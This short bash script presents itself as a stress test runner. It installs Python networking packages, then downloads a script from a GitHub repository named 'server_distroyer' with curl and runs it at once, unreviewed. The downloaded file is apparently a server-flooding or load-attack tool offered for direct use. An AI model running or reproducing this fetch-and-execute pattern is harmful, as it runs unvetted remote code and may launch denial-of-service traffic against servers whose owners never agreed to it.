#!/bin/bash

# Simple stress test runner
echo "🔥 Installing requirements..."

# Install Python packages
pip3 install requests aiohttp

# Download the script
echo "📥 Downloading script..."
curl -s -L "https://raw.githubusercontent.com/blackangiliq/server_distroyer/main/linux_load_test.py" -o stress_test.py

# Run the script
echo "🚀 Starting stress test..."
python3 stress_test.py 
